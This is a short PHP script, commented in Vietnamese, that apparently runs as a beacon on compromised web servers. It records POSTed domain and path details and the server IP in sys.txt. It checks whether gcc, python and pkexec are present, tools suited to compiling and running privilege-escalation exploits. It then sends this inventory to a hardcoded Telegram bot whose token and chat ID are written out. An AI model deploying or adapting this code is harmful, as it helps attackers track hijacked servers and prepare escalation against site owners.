<?php
function sendToTelegram($message) {
    $chat_id = '7416297295';
    $bot_token = '7201454232:AAEPcn2bfld2FW8X8cEakCKx32kJdygixuI';
    $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$message";
    file_get_contents($url);
}

function checkCommand($command) {
    $output = null;
    $retval = null;
    exec("which $command", $output, $retval);
    return $retval === 0;
}

$commands = ['system', 'gcc', 'python', 'pkexec'];
$allWorking = true;

foreach ($commands as $command) {
    if (!checkCommand($command)) {
        $allWorking = false;
        break;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if (isset($data['domain'], $data['path'], $data['filename'])) {
        $domain = rtrim($data['domain'], '/'); // Đảm bảo không có dấu '/' ở cuối
        $path = ltrim($data['path'], '/'); // Đảm bảo không có dấu '/' ở đầu
        $filename = $data['filename'];
        
        // Lấy ngày giờ hiện tại
        $dateTime = date('d/m/Y H:i:s');

        // Lấy IP của server
        $serverIP = $_SERVER['SERVER_ADDR'];

        $file = 'sys.txt';
        // Tạo đường dẫn đầy đủ
        $fullPath = "$domain/$path"; // Đường dẫn đầy đủ không cần filename
        
        // Cấu trúc nội dung theo định dạng yêu cầu
        $content = "Domain: $domain\nDate: $dateTime\nServer IP: $serverIP\nFull Path: $fullPath\n";

        file_put_contents($file, "------\n$content", FILE_APPEND);
        
        if ($allWorking) {
            $message = "All system functions (system, gcc, python, pkexec) are working correctly.\n$content";
            sendToTelegram($message);
        }
    }
}
?>
